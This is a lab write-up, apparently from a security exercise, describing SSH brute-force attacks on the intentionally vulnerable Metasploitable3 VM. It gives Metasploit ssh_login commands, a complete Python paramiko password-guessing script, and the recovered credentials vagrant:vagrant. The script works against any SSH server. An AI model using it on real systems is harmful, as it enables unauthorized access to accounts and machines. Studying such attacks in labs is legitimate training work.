Here’s the revised content with the outputs placed in distinguished boxes for better clarity:

---

# Phase 1: SSH Service Compromise  

---

## Overview  
This phase demonstrates SSH brute force attacks against Metasploitable3 using:  
- Metasploit Framework (`ssh_login` module)  
- Custom Python brute force script  
- Successfully identified vulnerable credentials:  
  `vagrant:vagrant`  

---

## Attack Methodologies  

![image](https://github.com/user-attachments/assets/19d3a39f-f3a8-4b12-8f30-b185c878e1aa)

### 1. Metasploit Brute Force Attack  
#### Configuration:  
```bash
use auxiliary/scanner/ssh/ssh_login
set RHOST 192.168.56.102
set RPORT 22
set USER_FILE /absolute/path/usernames.txt
set PASS_FILE /absolute/path/passwords.txt
set THREADS 3
run
```

#### **Output:**  
```
[*] 192.168.56.102:22 - Starting brute force
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

#### **Key Findings:**  
- Required absolute paths for credential files  
- Case-sensitive commands (e.g., `set`, not `SET`)  
- Full scan of the target system successfully completed  

---

### 2. Custom Python Brute Force Script  

![image](https://github.com/user-attachments/assets/19bc2092-83d9-4c58-a290-8792e1a389a8)

#### Script: `compromise.py`  
```python
import paramiko
import time

TARGET_IP = "192.168.56.103"
PORT = 22
USERNAME_FILE = "username.stxt"
PASSWORD_FILE = "password.stxt"
COMMAND_TO_RUN = "ip a"

def attempt_login(hostname, port, username, password):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(hostname=hostname, port=port, username=username, password=password, timeout=5)
        print(f"[+] Successfully logged in as {username}:{password} on {hostname}")
        return client
    except paramiko.AuthenticationException:
        print(f"[-] Login failed for {username}:{password} on {hostname}")
    except paramiko.SSHException as e:
        print(f"[-] SSH error connecting to {hostname}: {e}")
    except Exception as e:
        print(f"[-] An error occurred: {e}")
    return None

def execute_command(client, command):
    try:
        stdin, stdout, stderr = client.exec_command(command)
        output = stdout.read().decode().strip()
        error = stderr.read().decode().strip()
        if output:
            print(f"[+] Command executed successfully. Output:\n{output}")
        if error:
            print(f"[-] Error executing command:\n{error}")
    except Exception as e:
        print(f"[-] Error executing command: {e}")

def main():
    usernames = []
    passwords = []

    try:
        with open(USERNAME_FILE, 'r') as f:
            usernames = [line.strip() for line in f]
    except FileNotFoundError:
        print(f"[-] Error: {USERNAME_FILE} not found.")
        return

    try:
        with open(PASSWORD_FILE, 'r') as f:
            passwords = [line.strip() for line in f]
    except FileNotFoundError:
        print(f"[-] Error: {PASSWORD_FILE} not found.")
        return

    for username in usernames:
        for password in passwords:
            print(f"[+] Trying {username}:{password} on {TARGET_IP}:{PORT}")
            ssh_client = attempt_login(TARGET_IP, PORT, username, password)
            if ssh_client:
                print("[+] Proof of Concept:")
                execute_command(ssh_client, COMMAND_TO_RUN)
                ssh_client.close()
                print("[+] Connection closed.")
                return

if __name__ == "__main__":
    main()
```

#### **Execution:** 

![image](https://github.com/user-attachments/assets/7afeb784-38fd-4788-aa69-2df8ee1db8a5)
 
```bash
python3 compromise.py
```

#### **Output:**  
```
[+] Successfully logged in as vagrant:vagrant
```

---

## Discovered Credentials  
- **Username:** `vagrant`  
- **Password:** `vagrant`  

---

## Requirements  

- Metasploit Framework (v6.3+)  
- Python 3.8+  
- Paramiko (Install via `pip install paramiko`)  

--- 

Let me know if you need further refinements!
